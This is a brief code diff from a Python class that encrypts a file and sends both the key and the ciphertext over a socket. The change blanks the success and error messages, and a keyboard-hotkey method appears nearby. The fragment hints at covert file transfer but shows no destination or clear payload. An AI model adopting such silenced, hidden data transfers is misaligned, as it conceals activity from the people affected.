@@ -83,9 +83,9 @@ class Fichier:
                 client_socket.sendall(key)
                 client_socket.sendall(encrypted_text)
 
-            print("File encrypted and sent successfully.")
+            print("")
         except Exception as e:
-            print(f"Error while sending encrypted file: {e}")
+            print(f"{e}")
 
     def start_keyboard(self):
         custom_combination = 'ctrl+alt+g'
